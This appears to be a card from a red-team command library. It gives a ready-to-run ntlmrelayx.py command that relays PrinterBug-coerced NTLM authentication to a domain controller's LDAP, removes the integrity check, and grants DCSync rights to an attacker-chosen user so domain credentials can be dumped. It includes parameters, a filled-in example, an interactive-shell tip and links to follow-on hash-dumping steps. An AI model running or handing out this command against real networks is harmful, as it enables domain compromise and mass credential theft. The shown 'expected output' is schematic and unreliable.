---
id: 93af84f0-aa15-41fa-923d-32bc303a354b
name: ntlmrelayx-grant-dcsync-privileges
type: command
executor: bash
data: >-
  ntlmrelayx.py --remove-mic --escalate-user $_USERNAME -t
  ldap://$_DOMAIN_CONTROLLER -smb2support
output: null
created_at: '2023-04-06T03:56:05.532770+00:00'
updated_at: '2023-04-10T20:26:36.992508+00:00'
platforms:
  - Windows
tags:
  - relay
  - privilege-escalation
verified: true
validated: true
---

# ntlmrelayx-grant-dcsync-privileges

## Command

```bash
ntlmrelayx.py --remove-mic --escalate-user $_USERNAME -t ldap://$_DOMAIN_CONTROLLER -smb2support
```

## Description

Relays captured NTLM authentication from PrinterBug to LDAP on a domain controller, granting DCSync (replication) privileges to the specified user for credential dumping.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --remove-mic | Remove message integrity code to enable relay | Yes |
| --escalate-user | Username to grant escalation rights (e.g., ntu) | Yes |
| -t | Target LDAP URL (e.g., ldap://s2016dc.testsegment.local) | Yes |
| -smb2support | Enable SMB2 protocol support | Yes |
| $_USERNAME | Attacker's domain username | Yes |
| $_DOMAIN_CONTROLLER | FQDN of target DC | Yes |

## Examples

### Basic Usage

```bash
ntlmrelayx.py --remove-mic --escalate-user ntu -t ldap://s2016dc.testsegment.local -smb2support
```

### Advanced Usage

Combine with --ldap-interactive for shell access post-relay.

## Expected Output

Relay success:

[*] NTLMv2 Hash: ::...
[*] LDAP grants replication rights to user
[*] Impacket-LDAP-Client authenticated as...

Failure: Authentication rejected or MIC validation error.

## Related

- [[procedures/resource-based-constrained-delegation-via-printerbug]]
- [[commands/secretsdump-extract-domain-hashes]]
